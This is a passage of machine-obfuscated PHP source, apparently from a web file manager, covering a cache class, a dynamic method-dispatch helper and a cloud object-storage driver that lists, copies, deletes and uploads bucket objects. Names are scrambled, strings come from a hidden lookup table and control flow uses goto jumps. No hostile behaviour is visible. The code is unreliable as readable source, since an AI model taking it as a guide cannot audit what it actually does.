self::$memoryCache[$Ç“ßµóÒ] === $Ÿûî‰Ù) { return !0; } if ($ğßÖ™Ãü === 0) { self::$memoryCache[$Ç“ßµóÒ] = $Ÿûî‰Ù; return !0; } CacheLock::lock($§¡É¾º³); $Ù•ƒº·© = self::init()->set($Ç“ßµóÒ, serialize($Ÿûî‰Ù), $ğßÖ™Ãü); self::$memoryCache[$Ç“ßµóÒ] = $Ÿûî‰Ù; CacheLock::unlock($§¡É¾º³); return $Ù•ƒº·©; } public static function getCall($¤¿Ó¢²½, $¸ìÀş±º, $ƒó×»Ö³, $ÄµË‚àú = array()) { $¿©ŸÙ¡ =& $_SERVER[ßğøİ]; $ÍÒÂ½¾ö = self::get($¤¿Ó¢²½); if ($ÍÒÂ½¾ö || $ÍÒÂ½¾ö === $¿©ŸÙ¡[12]) { return $ÍÒÂ½¾ö; } $ÍÒÂ½¾ö = call_user_func_array($ƒó×»Ö³, $ÄµË‚àú); $ÍÒÂ½¾ö = $ÍÒÂ½¾ö ? $ÍÒÂ½¾ö : $¿©ŸÙ¡[12]; self::set($¤¿Ó¢²½, $ÍÒÂ½¾ö, $¸ìÀş±º); return $ÍÒÂ½¾ö; } public static function remove($õ¤¬Ô·) { $Î‘¤´“  = self::key($õ¤¬Ô·); unset(self::$memoryCache[$Î‘¤´“ ]); self::clearTimeout(); CacheLock::lock($õ¤¬Ô·); $ æÊƒù = self::init()->remove($Î‘¤´“ ); CacheLock::unlock($õ¤¬Ô·); return $ æÊƒù; } public static function removeMemory($Ú®ªİ®´) { $§Ä½ç‹Ù = self::key($Ú®ªİ®´); unset(self::$memoryCache[$§Ä½ç‹Ù]); } public static function clearMemory($¶‡Óõß = false) { if ($¶‡Óõß) { $¶‡Óõß = self::key($¶‡Óõß); unset(self::$memoryCache[$¶‡Óõß]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ßğøİ][829])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ßğøİ][830])) { self::init()->clearTimeout(); } } } goto DÊ‘ÙÙµß; B¶¯¿´ƒ¬³: function binCheckBigger($¾Ğ»”Áö, $Ú¿áôöŒ) { return $¾Ğ»”Áö > $Ú¿áôöŒ; } $_SERVER[$_SERVER[äÓ¯ÍÙ][3]] = (base64_decode('ODEwMA==')."\67\62")+0;$_m2jx="yxujnhsi137e5b4l0ovtr8mqdazgpck6fw92zt1faro8umy3g6ijxvpq4dbln29wekh750c";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Š–Ş™¶, $£İÈ’…°) { $ê’Õ–ØÎ =& $_SERVER[ßğøİ]; if (isset(self::$_methodList[$Š–Ş™¶])) { return @call_user_func_array(self::$_methodList[$Š–Ş™¶], $£İÈ’…°); } else { if (method_exists($this, $Š–Ş™¶)) { return call_user_func_array(array($this, $Š–Ş™¶), $£İÈ’…°); } else { think_exception(__CLASS__ . $ê’Õ–ØÎ[4] . $Š–Ş™¶ . $ê’Õ–ØÎ[5]); } } } public static function __callStatic($“ı©´Û, $âöşŒåù) { if (isset(self::$_methodListStatic[$“ı©´Û])) { return call_user_func_array(self::$_methodListStatic[$“ı©´Û], $âöşŒåù); } else { if (method_exists(self, $“ı©´Û)) { return call_user_func_array(array(self, $“ı©´Û), $âöşŒåù); } else { show_json("{$“ı©´Û}\50\x29\x20\x6e\x6f\164\x20\x65\x78\x69\x73\x74\73", !1); } } } public static function addMethod($²Ûá ğ, $éî³Ø»Î) { self::$_methodList[$²Ûá ğ] = $éî³Ø»Î; } public static function addMethodStatic($½Êáéª , $ŠÙÊ£„Ö) { self::$_methodListStatic[$½Êáéª ] = $ŠÙÊ£„Ö; } } goto EÄÄ¤»¬ìë; F’ù¨†¨—ì: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($Âƒ“Ó) { parent::__construct(); include_once SDK_DIR . $_SERVER[ßğøİ][1382]; $this->_init($Âƒ“Ó); } public function _init($Ûé‘Ò) { $ü“÷ªàæ =& $_SERVER[ßğøİ]; foreach ($Ûé‘Ò as $¸İØÉêÙ => $œå¨ù ) { if (isset($this->{$¸İØÉêÙ})) { $this->{$¸İØÉêÙ} = $œå¨ù ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ü“÷ªàæ[1383] . LNG($ü“÷ªàæ[1384])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $è¬”¢æÔ =& $_SERVER[ßğøİ]; $ÓŸ°´ê§ = new OSS\Model\CorsConfig(); $Ï¥µù—— = new OSS\Model\CorsRule(); $Ï¥µù——->addAllowedOrigin($è¬”¢æÔ[1385]); $Ï¥µù——->addAllowedMethod($è¬”¢æÔ[1386]); $Ï¥µù——->addAllowedMethod($è¬”¢æÔ[1387]); $Ï¥µù——->addAllowedMethod($è¬”¢æÔ[1388]); $Ï¥µù——->addAllowedMethod($è¬”¢æÔ[1389]); $Ï¥µù——->addAllowedMethod($è¬”¢æÔ[160]); $Ï¥µù——->setMaxAgeSeconds(600); $Ï¥µù——->addExposeHeader($è¬”¢æÔ[1390]); $Ï¥µù——->addAllowedHeader($è¬”¢æÔ[1385]); $ÓŸ°´ê§->addRule($Ï¥µù——); try { $this->client->putBucketCors($this->bucket, $ÓŸ°´ê§); } catch (OSS\Core\OssException $‰ØŒÙ¯°) { return !1; } return !0; } public function getBucketCors() { $ÖÁÓŞ»­ =& $_SERVER[ßğøİ]; $úÊ±¯ã² = null; try { $úÊ±¯ã² = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ãó¡×ä) { return null; } if (!$úÊ±¯ã² || !($‘§Ì‚ß = $úÊ±¯ã²->getRules())) { return null; } $–èÈ¥Ş€ = $‘§Ì‚ß[0]->getAllowedOrigins(); $ğ¯ıË½ = $‘§Ì‚ß[0]->getAllowedMethods(); $ƒ™Ù¼¾É = $‘§Ì‚ß[0]->getMaxAgeSeconds(); $ˆŸ›µËä = $‘§Ì‚ß[0]->getExposeHeaders(); $ˆ×ØÙÁ = $‘§Ì‚ß[0]->getAllowedHeaders(); return array($ÖÁÓŞ»­[187] => isset($–èÈ¥Ş€[0]) ? $–èÈ¥Ş€[0] : $ÖÁÓŞ»­[12], $ÖÁÓŞ»­[191] => $ğ¯ıË½, $ÖÁÓŞ»­[1391] => $ƒ™Ù¼¾É, $ÖÁÓŞ»­[1392] => isset($ˆŸ›µËä[0]) ? $ˆŸ›µËä[0] : $ÖÁÓŞ»­[12], $ÖÁÓŞ»­[189] => isset($ˆ×ØÙÁ[0]) ? $ˆ×ØÙÁ[0] : $ÖÁÓŞ»­[12]); } public function isBucketCors() { $ôÈ«ÚŒ =& $_SERVER[ßğøİ]; $ºõÎŒ¼Ã = $this->getBucketCors(); if (!$ºõÎŒ¼Ã || !is_array($ºõÎŒ¼Ã)) { return !1; } if ($ºõÎŒ¼Ã[$ôÈ«ÚŒ[187]] != $ôÈ«ÚŒ[188] || $ºõÎŒ¼Ã[$ôÈ«ÚŒ[189]] != $ôÈ«ÚŒ[188]) { return !1; } $õâğ®†Ğ = array_map($ôÈ«ÚŒ[190], $ºõÎŒ¼Ã[$ôÈ«ÚŒ[191]]); if (!is_array($õâğ®†Ğ)) { $õâğ®†Ğ = array(); } $«µ¹ı† = array($ôÈ«ÚŒ[192], $ôÈ«ÚŒ[193], $ôÈ«ÚŒ[194], $ôÈ«ÚŒ[195], $ôÈ«ÚŒ[196]); $ÄŒ×ÑÑ = array_diff($«µ¹ı†, $õâğ®†Ğ); return empty($ÄŒ×ÑÑ); } public function mkfile($äÂõºÇ, $óí¥”×… = '', $×¿œ°° = REPEAT_RENAME) { $™¿—ÈØÈ = $this->setContent($äÂõºÇ, $óí¥”×…); if ($™¿—ÈØÈ !== !1) { return $this->getPathOuter($äÂõºÇ); } return !1; } public function mkdir($úæô©‹ù, $ÏŒÔÎ˜Â = REPEAT_SKIP) { if ($ÏŒÔÎ˜Â && $this->_isFolder($úæô©‹ù)) { return $this->getPathOuter($úæô©‹ù); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($úæô©‹ù)); } catch (OSS\Core\OssException $œµÕ¦ÃĞ) { return !1; } return $this->getPathOuter($úæô©‹ù); } private function fileList($³‚©„Á¡, $ü¾ç³¸ = '', $“Îğ£¥ = 0) { $òªÆõï =& $_SERVER[ßğøİ]; $³‚©„Á¡ = trim($³‚©„Á¡, $òªÆõï[8]); $€Øıİ» = empty($³‚©„Á¡) && $³‚©„Á¡ !== $òªÆõï[197] ? $òªÆõï[12] : $³‚©„Á¡ . $òªÆõï[8]; $ƒ¼‹îÊÏ = $òªÆõï[12]; $àü›üı¹ = 1000; $ˆùÆµÊ = $ë·‚†Ãµ = array(); while (!0) { check_abort(); $Ã€Ñ‚¸ = array($òªÆõï[1393] => $ü¾ç³¸, $òªÆõï[1394] => $€Øıİ», $òªÆõï[1395] => $àü›üı¹, $òªÆõï[1396] => $ƒ¼‹îÊÏ); try { $ÏÖıèÎæ = $this->client->listObjects($this->bucket, $Ã€Ñ‚¸); } catch (OSS\Core\OssException $¡êäÚ÷Á) { break; } $ƒ¼‹îÊÏ = $ÏÖıèÎæ->getNextMarker(); $‚Ø­–œ = $ÏÖıèÎæ->getObjectList(); $±›Òä– = $ÏÖıèÎæ->getPrefixList(); foreach ($‚Ø­–œ as $‚âÄü‰) { if ($‚âÄü‰->getKey() == $€Øıİ») { continue; } $²‘È¬Ï· = $‚âÄü‰->getKey(); $«Øè¹ï× = $‚âÄü‰->getSize(); $ÚÆ‘Îš = $‚âÄü‰->getLastModified(); $€¹èªşó = $“Îğ£¥ ? array($òªÆõï[32] => $²‘È¬Ï·, $òªÆõï[76] => $«Øè¹ï×, $òªÆõï[203] => strtotime($ÚÆ‘Îš)) : $²‘È¬Ï·; $•ìæ‰Åù = $«Øè¹ï× == 0 && substr($²‘È¬Ï·, strlen($²‘È¬Ï·) - 1, 1) == $òªÆõï[8] ? !0 : !1; $„ÅÔ˜¨ = array($òªÆõï[76] => $«Øè¹ï×, $òªÆõï[1397] => $«Øè¹ï×, $òªÆõï[85] => strtotime($ÚÆ‘Îš), $òªÆõï[1398] => $ÚÆ‘Îš); $this->cacheMethodInfoSet($²‘È¬Ï·, $•ìæ‰Åù, $„ÅÔ˜¨); if ($•ìæ‰Åù) { $ˆùÆµÊ[] = $²‘È¬Ï·; continue; } $ë·‚†Ãµ[] = $€¹èªşó; } foreach ($±›Òä– as $Ô»Õš†ë) { $ˆùÆµÊ[] = $Ô»Õš†ë->getPrefix(); $this->cacheMethodInfoSet($Ô»Õš†ë->getPrefix(), !0); } if ($ƒ¼‹îÊÏ === $òªÆõï[12]) { break; } } $this->cacheMethodInfoSet($³‚©„Á¡, !0); return array($òªÆõï[82] => $ˆùÆµÊ, $òªÆõï[83] => $ë·‚†Ãµ); } public function copyFile($›Ú‰ı¤×, $¬Üîàœ«) { $”†ÒÉßÄ = $this->size($›Ú‰ı¤×); if ($”†ÒÉßÄ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $›Ú‰ı¤×, $this->bucket, $this->pathEncode($¬Üîàœ«)); } catch (OSS\Core\OssException $‡³ãÉÑ) { return !1; } return $this->getPathOuter($¬Üîàœ«); } $ìÂŒ×çû = $this->multiCopyObject($›Ú‰ı¤×, $¬Üîàœ«, $”†ÒÉßÄ); return $ìÂŒ×çû ? $this->getPathOuter($¬Üîàœ«) : !1; } private function multiCopyObject($ş’ÈŠşŠ, $Ôáîö ı, $¢Ï”êŸª) { $Ëˆ‚ù•õ =& $_SERVER[ßğøİ]; try { $ÎÆ¢ÏÔ² = array(); if ($ĞƒÏ­„É = $this->hashMd5($ş’ÈŠşŠ)) { $ÎÆ¢ÏÔ² = array(OSS\OssClient::OSS_HEADERS => array($Ëˆ‚ù•õ[1399] => $ĞƒÏ­„É)); } $ëŸàÙÖ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ôáîö ı), $ÎÆ¢ÏÔ²); $²´£—¤ = 1; $ğøÛ¸êÍ = 0; $íïŠ¡ = array(); $¨˜®ŞŠ = 1024 * 1024 * 10; $š¨ı•Ò¿ = $this->client->generateMultiuploadParts($¢Ï”êŸª, $¨˜®ŞŠ); foreach ($š¨ı•Ò¿ as $Õ‚›·‹œ => $éô±áÃ) { $ñÃ ¤É‡ = $ğøÛ¸êÍ + (int) $éô±áÃ[$Ëˆ‚ù•õ[1400]]; $‡–Õ½« = (int) $éô±áÃ[$Ëˆ‚ù•õ[337]] + $ñÃ ¤É‡ - 1; $¥³ôú¢¬ = array($Ëˆ‚ù•õ[1401] => $ñÃ ¤É‡, $Ëˆ‚ù•õ[1402] => $‡–Õ½«); $íïŠ¡[] = $this->client->uploadPartCopy($this->bucket, $ş’ÈŠşŠ, $this->bucket, $this->pathEncode($Ôáîö ı), $²´£—¤, $ëŸàÙÖ, $¥³ôú¢¬); $²´£—¤ = $²´£—¤ + 1; } $†È·öÒ£ = array(); foreach ($íïŠ¡ as $Õ‚›·‹œ => $š‘»à) { $†È·öÒ£[] = array($Ëˆ‚ù•õ[1403] => $Õ‚›·‹œ + 1, $Ëˆ‚ù•õ[1404] => $š‘»à); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ôáîö ı), $ëŸàÙÖ, $†È·öÒ£); } catch (OSS\Core\OssException $“—ö¥œŸ) { return !1; } return !0; } public function moveFile($¾ŸÆ¾Ê¥, $¸“ïÓÕÍ) { if ($this->copyFile($¾ŸÆ¾Ê¥, $¸“ïÓÕÍ)) { $this->remove($¾ŸÆ¾Ê¥); return $this->getPathOuter($¸“ïÓÕÍ); } return !1; } public function delFile($‹ô„İä) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($‹ô„İä)); } catch (OSS\Core\OssException $à¥¡å®ç) { return !1; } return !0; } public function delFolder($˜¯ıµÑ) { $ó’µì¬í =& $_SERVER[ßğøİ]; if (!$this->exist($˜¯ıµÑ)) { return !0; } $this->listItemCache = !1; $è…¯¡• = $this->fileList($˜¯ıµÑ); $this->listItemCache = !0; $ì¹Ú¤•Ö = trim($˜¯ıµÑ, $ó’µì¬í[8]) . $ó’µì¬í[8]; if (!empty($˜¯ıµÑ) && $˜¯ıµÑ !== $ó’µì¬í[197] && !in_array($ì¹Ú¤•Ö, $è…¯¡•[$ó’µì¬í[82]])) { $è…¯¡•[$ó’µì¬í[82]][] = $ì¹Ú¤•Ö; } $¹ùı§ÙÍ = $this->delByBatch($è…¯¡•[$ó’µì¬í[83]]); if (!$¹ùı§ÙÍ) { return !1; } $¹ùı§ÙÍ = $this->delByBatch($è…¯¡•[$ó’µì¬í[82]]); if (!$¹ùı§ÙÍ) { return !1; } return $this->delFile($ì¹Ú¤•Ö); } private function delByBatch($¥®æ«î) { foreach (array_chunk($¥®æ«î, 1000) as $ÕŞÙ§¨) { try { $this->client->deleteObjects($this->bucket, $ÕŞÙ§¨); } catch (OSS\Core\OssException $öçÕèá°) { return !1; } } return !0; } public function rename($Èù¶áîò, $Ãà€éÎ) { return $this->renameObject($Èù¶áîò, $Ãà€éÎ); } private function fileInfo($¾´„»¨, $…Ø–åŠ¤ = false, $°óú‰òš = array()) { $Ãã§Ş¬ç =& $_SERVER[ßğøİ]; $òÕÖİ–Â = array($Ãã§Ş¬ç[32] => $this->pathThis($¾´„»¨), $Ãã§Ş¬ç[84] => $this->getPathOuter($¾´„»¨), $Ãã§Ş¬ç[33] => $Ãã§Ş¬ç[199], $Ãã§Ş¬ç[76] => isset($°óú‰òš[$Ãã§Ş¬ç[76]]) ? $°óú‰òš[$Ãã§Ş¬ç[76]] : 0, $Ãã§Ş¬ç[174] => $this->ext($¾´„»¨)); if ($…Ø–åŠ¤) { return $òÕÖİ–Â; } $òÕÖİ–Â[$Ãã§Ş¬ç[200]] = $òÕÖİ–Â[$Ãã§Ş¬ç[85]] = 0; $òÕÖİ–Â[$Ãã§Ş¬ç[201]] = $òÕÖİ–Â[$Ãã§Ş¬ç[202]] = !0; if (empty($°óú‰òš)) { $»ğ’¬êÅ = $this->objectMeta($¾´„»¨); if (!$»ğ’¬êÅ) { return $òÕÖİ–Â; } $°óú‰òš = array($Ãã§Ş¬ç[85] => strtotime($»ğ’¬êÅ[$Ãã§Ş¬ç[1398]]), $Ãã§Ş¬ç[76] => $»ğ’¬êÅ[$Ãã§Ş¬ç[1397]] + 0); } if (isset($°óú‰òš[$Ãã§Ş¬ç[76]])) { $òÕÖİ–Â[$Ãã§Ş¬ç[76]] = $°óú‰òš[$Ãã§Ş¬ç[76]]; } if (isset($°óú‰òš[$Ãã§Ş¬ç[85]])) { $òÕÖİ–Â[$Ãã§Ş¬ç[85]] = $°óú‰òš[$Ãã§Ş¬ç[85]]; } if (isset($°óú‰òš[$Ãã§Ş¬ç[203]]) && !trim($òÕÖİ–Â[$Ãã§Ş¬ç[85]])) { $òÕÖİ–Â[$Ãã§Ş¬ç[85]] = $°óú‰òš[$Ãã§Ş¬ç[203]]; } return $òÕÖİ–Â; } private function folderInfo($ìÔğÆ£, $º™÷ÌİÃ = false, $Ø»æùšÆ = array()) { $ƒšõÑÅÌ =& $_SERVER[ßğøİ]; $Ÿâ¨ª’Å = array($ƒšõÑÅÌ[32] => $this->pathThis($ìÔğÆ£), $ƒšõÑÅÌ[84] => $this->getPathOuter($ƒšõÑÅÌ[8] . $ìÔğÆ£), $ƒšõÑÅÌ[33] => $ƒšõÑÅÌ[75]); if ($º™÷ÌİÃ) { return $Ÿâ¨ª’Å; } $Ÿâ¨ª’Å[$ƒšõÑÅÌ[200]] = $Ÿâ¨ª’Å[$ƒšõÑÅÌ[85]] = 0; $Ÿâ¨ª’Å[$ƒšõÑÅÌ[201]] = $Ÿâ¨ª’Å[$ƒšõÑÅÌ[202]] = !0; if (empty($Ø»æùšÆ)) { $ìÔğÆ£ = rtrim($ìÔğÆ£, $ƒšõÑÅÌ[8]) . $ƒšõÑÅÌ[8]; $úá•ƒª  = $this->objectMeta($ìÔğÆ£); if (!$úá•ƒª ) { return $Ÿâ¨ª’Å; } $Ø»æùšÆ = array($ƒšõÑÅÌ[200] => $úá•ƒª [$ƒšõÑÅÌ[511]][$ƒšõÑÅÌ[1405]], $ƒšõÑÅÌ[85] => strtotime($úá•ƒª [$ƒšõÑÅÌ[1398]])); } if (isset($Ø»æùšÆ[$ƒšõÑÅÌ[85]])) { $Ÿâ¨ª’Å[$ƒšõÑÅÌ[85]] = $Ø»æùšÆ[$ƒšõÑÅÌ[85]]; } if (isset($Ø»æùšÆ[$ƒšõÑÅÌ[200]])) { $Ÿâ¨ª’Å[$ƒšõÑÅÌ[200]] = $Ø»æùšÆ[$ƒšõÑÅÌ[200]]; } return $Ÿâ¨ª’Å; } public function listPath($ñÅ‚³Üá, $ò›˜‰ß¤ = false) { $¦çÛ¸ğ­ =& $_SERVER[ßğøİ]; $¨ËƒÖı» = $this->fileList($ñÅ‚³Üá, $¦çÛ¸ğ­[8], !0); foreach ($¨ËƒÖı»[$¦çÛ¸ğ­[82]] as $®á½Ş¤ => $¾ ¡‡š) { $¨ËƒÖı»[$¦çÛ¸ğ­[82]][$®á½Ş¤] = $this->folderInfo($¾ ¡‡š, $ò›˜‰ß¤, $¾ ¡‡š); } foreach ($¨ËƒÖı»[$¦çÛ¸ğ­[83]] as $®á½Ş¤ => $¾ ¡‡š) { $¨ËƒÖı»[$¦çÛ¸ğ­[83]][$®á½Ş¤] = $this->fileInfo($¾ ¡‡š[$¦çÛ¸ğ­[32]], $ò›˜‰ß¤, $¾ ¡‡š); } return $¨ËƒÖı»; } protected function infoChildren($¨íØ½Â™, &$‹¿¼Õ¥Ÿ) { $À®ÈÄûÅ =& $_SERVER[ßğøİ]; $¸èõ’· = $this->fileList($¨íØ½Â™, $À®ÈÄûÅ[12], !0); $‹¿¼Õ¥Ÿ[$À®ÈÄûÅ[78]] += count($¸èõ’·[$À®ÈÄûÅ[82]]); $‹¿¼Õ¥Ÿ[$À®ÈÄûÅ[77]] += count($¸èõ’·[$À®ÈÄûÅ[83]]); foreach ($¸èõ’·[$À®ÈÄûÅ[83]] as $Ò´£ºèØ) { if (!$Ò´£ºèØ || !$Ò´£ºèØ[$À®ÈÄûÅ[76]]) { continue; } $‹¿¼Õ¥Ÿ[$À®ÈÄûÅ[76]] += $Ò´£ºèØ[$À®ÈÄûÅ[76]]; } } public function has($ßëğÓ©û, $¤¡‡ = false, $Ò¥··æë = true) { $×Ù‚öÜ¹ =& $_SERVER[ßğøİ]; $ßëğÓ©û = trim($ßëğÓ©û, $×Ù‚öÜ¹[8]); $ŠÚ“· = empty($ßëğÓ©û) && $ßëğÓ©û !== $×Ù‚öÜ¹[197] ? $×Ù‚öÜ¹[12] : $ßëğÓ©û . $×Ù‚öÜ¹[8]; $æî®ÈÚ = $×Ù‚öÜ¹[12]; $ßìâ¶–Ó = 500; $ğ´ñŸì  = $†ÆìÜ¶° = 0; while (!0) { check_abort(); $ªƒåêÄ÷ = array($×Ù‚öÜ¹[1393] => $×Ù‚öÜ¹[8], $×Ù‚öÜ¹[1394] => $ŠÚ“·, $×Ù‚öÜ¹[1395] => $ßìâ¶–Ó, $×Ù‚öÜ¹[1396] => $æî®ÈÚ); try { $ïİ…Ìİ— = $this->client->listObjects($this->bucket, $ªƒåêÄ÷); } catch (OSS\Core\OssException $äç¾¶Áç) { break; } $æî®ÈÚ = $ïİ…Ìİ—->getNextMarker(); $Ñ²ş‡îÜ = $ïİ…Ìİ—->getObjectList(); $öæüÆâŸ = $ïİ…Ìİ—->getPrefixList(); if ($¤¡‡) { if (count($Ñ²ş‡îÜ) > 1 || count($Ñ²ş‡îÜ) == 1 && $Ñ²ş‡îÜ[0]->getKey() != $ŠÚ“·) { $ğ´ñŸì  += count($Ñ²ş‡îÜ) - 1; } if (!empty($öæüÆâŸ)) { $†ÆìÜ¶° += count($öæüÆâŸ); } if ($æî®ÈÚ === $×Ù‚öÜ¹[12]) { break; } continue; } if ($Ò¥··æë) { if (!empty($Ñ²ş‡îÜ)) { if (count($Ñ²ş‡îÜ) > 1 || $Ñ²ş‡îÜ[0]->getKey() != $ŠÚ“·) { return !0; } } } else { if (!empty($öæüÆâŸ)) { return !0; } } if ($æî®ÈÚ === $×Ù‚öÜ¹[12]) { break; } } if ($¤¡‡) { return array($×Ù‚öÜ¹[207] => $ğ´ñŸì , $×Ù‚öÜ¹[208] => $†ÆìÜ¶°); } return !1; } public function listAll($ø´ĞøÒ®) { $­ê¹†Áş =& $_SERVER[ßğøİ]; $‰ş…ıÎ– = $this->fileList($ø´ĞøÒ®, $­ê¹†Áş[12], !0); $¿Ûãëšä = array(); foreach ($‰ş…ıÎ–[$­ê¹†Áş[83]] as $€‹½–ğ›) { $¿Ûãëšä[$€‹½–ğ›[$­ê¹†Áş[32]]] = $€‹½–ğ›[$­ê¹†Áş[76]]; } foreach ($‰ş…ıÎ–[$­ê¹†Áş[82]] as $€‹½–ğ›) { if (is_string($€‹½–ğ›)) { $¿Ûãëšä[$€‹½–ğ›] = 0; } } return $this->listAllFiles($ø´ĞøÒ®, array_keys($¿Ûãëšä), $¿Ûãëšä); } public function canRead($“ä•›¥–) { $ø˜Úæ¨ò =& $_SERVER[ßğøİ]; $ğ¦ÜñÉá = $this->pathAcl($“ä•›¥–); return $ğ¦ÜñÉá == $ø˜Úæ¨ò[1406] || $ğ¦ÜñÉá == $ø˜Úæ¨ò[556] ? !0 : !1; } public function canWrite($š¨©ğ) { $°‡¢ÚÜ³ = $this->pathAcl($š¨©ğ); return $°‡¢ÚÜ³ == $_SERVER[ßğøİ][556] ? !0 : !1; } public function pathAcl($œ§ÇÕƒƒ) { $Í»ö‘’ =& $_SERVER[ßğøİ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $èÉ¢•¡ï = $this->client->getObjectAcl($this->bucket, $this->pathEncode($œ§ÇÕƒƒ)); } catch (OSS\Core\OssException $‰µ„‚“) { return !1; } $²‹À”ò = $èÉ¢•¡ï == $Í»ö‘’[37] ? $this->bucketAcl : $èÉ¢•¡ï; if ($²‹À”ò == $Í»ö‘’[1407]) { return $Í»ö‘’[1406]; } if ($²‹À”ò == $Í»ö‘’[1408]) { return $Í»ö‘’[556]; } return $²‹À”ò; } private function chmodPath($¤‰èßŸº, $¦‹­¬‡“ = '') { $Ó†±ôĞù =& $_SERVER[ßğøİ]; $ìéê ú = empty($¦‹­¬‡“) ? $Ó†±ôĞù[1408] : $¦‹­¬‡“; $ö”ÁÒå„ = array($Ó†±ôĞù[37], $Ó†±ôĞù[198], $Ó†±ôĞù[1407], $Ó†±ôĞù[1408]); if (!in_array($ìéê ú, $ö”ÁÒå„)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¤‰èßŸº), $ìéê ú); } catch (OSS\Core\OssException $Ó©äµÓ×) { return !1; } return !0; } public function getContent($¦Ññ‚Â) { return $this->fileSubstr($¦Ññ‚Â, -1); } public function setContent($°¿İ‚ƒÜ, $Â·ÜŒé÷ = '') { $½·æÙŞ =& $_SERVER[ßğøİ]; try { $àŒ†·ğù = $this->trafficLimit($½·æÙŞ[1409]); $Ù¯ÔÙğØ = $this->client->putObject($this->bucket, $this->pathEncode($°¿İ‚ƒÜ), $Â·ÜŒé÷, $àŒ†·ğù); } catch (OSS\Core\OssException $òî½Êâë) { return !1; } $”‘ïÅÁ = array($½·æÙŞ[1399] => trim($Ù¯ÔÙğØ[$½·æÙŞ[1410]], $½·æÙŞ[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($°¿İ‚ƒÜ))); $this->updateObjMeta($°¿İ‚ƒÜ, $”‘ïÅÁ); return isset($Ù¯ÔÙğØ[$½·æÙŞ[1411]][$½·æÙŞ[1358]]) ? !0 : !1; } private function updateObjMeta($¸ß¤ß×, $øó·¸Œö) { $¸ß¤ß× = $this->pathEncode($¸ß¤ß×); try { $Ù”ğ¸£Ñ = array(OSS\OssClient::OSS_HEADERS => $øó·¸Œö); $this->client->copyObject($this->bucket, $¸ß¤ß×, $this->bucket, $¸ß¤ß×, $Ù”ğ¸£Ñ); } catch (OSS\Core\OssException $¹üïĞ ) { return !1; } return !0; } public function upload($ôúÏÅ¨ö, $½âÒåÂµ, $‘ñí§§¯ = false, $·Ğ™µº = REPEAT_REPLACE) { $¿ŠÑì£± =& $_SERVER[ßğøİ]; $·‚˜ = trim($ôúÏÅ¨ö, $¿ŠÑì£±[8]); $©ä„°ˆÓ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¿ŠÑì£±[1399] => @md5_file($½âÒåÂµ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ôúÏÅ¨ö))); $©ä„°ˆÓ = $this->trafficLimit($¿ŠÑì£±[1409], $©ä„°ˆÓ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($·‚˜), $½âÒåÂµ, $©ä„°ˆÓ); } catch (OSS\Core\OssException $Ÿˆ«®¼½) { return !1; } return $this->getPathOuter($ôúÏÅ¨ö); } public function getHost() { $•šÌßÀƒ =& $_SERVER[ßğøİ]; $ ß˜üöô = explode($•šÌßÀƒ[183], parent::getHost()); return $ ß˜üöô[0] . $•šÌßÀƒ[183] . $this->bucket . $•šÌßÀƒ[10] . $ ß˜üöô[1]; } public function uploadFormData($Â…³ì…Ç, $¾‚¤Õ«£ = 3600) { $¨ê‡İŒ =& $_SERVER[ßğøİ]; if (!($Ë²€¥¹ = $this->getHost())) { return !1; } $€ä®¾€¡ = $¾‚¤Õ«£; $Ê¸û˜Šå = date($¨ê‡İŒ[1412], time() + $€ä®¾€¡); $Èûİúš– = new DateTime($Ê¸û˜Šå); $ê¢Ÿõß = $Èûİúš–->format(DateTime::ISO8601); $â÷æØ¯  = strpos($ê¢Ÿõß, $¨ê‡İŒ[296]); $ê¢Ÿõß = substr($ê¢Ÿõß, 0, $â÷æØ¯ ) . $¨ê‡İŒ[1413]; $ÀòŒìÌª = 1048576000 * 5; $ÕÄèş¬ = $this->pathFather($Â…³ì…Ç); $‚†ßõİ‡ = array($¨ê‡İŒ[1312] => $ê¢Ÿõß, $¨ê‡İŒ[1313] => array(array($¨ê‡İŒ[1414], 0, $ÀòŒìÌª), array($¨ê‡İŒ[1316], $¨ê‡İŒ[1317], $ÕÄèş¬))); $”è¯¬ë = base64_encode(json_encode($‚†ßõİ‡)); $²Å¼¨ Û = base64_encode(hash_hmac($¨ê‡İŒ[232], $”è¯¬ë, $this->secret, !0)); $ÖÈæÙ‰ = array($¨ê‡İŒ[1322] => $”è¯¬ë, $¨ê‡İŒ[1415] => $this->accessKey, $¨ê‡İŒ[1318] => $¨ê‡İŒ[1310], $¨ê‡İŒ[1416] => $²Å¼¨ Û, $¨ê‡İŒ[181] => $Ë²€¥¹); $ÖÈæÙ‰ = $this->trafficLimit($¨ê‡İŒ[1409], $ÖÈæÙ‰); return $ÖÈæÙ‰; } public function multiUploadFormData($Ñùşì­ä, $ëãç·¿ = 3600) { $îÔà¹ˆ¶ =& $_SERVER[ßğøİ]; if (!($¨Û¸¥¢Ò = $this->getHost())) { return !1; } $á¬éµ¹¬ = $this->trafficLimit($îÔà¹ˆ¶[1409]); $ş¡“¢Ö¥ = 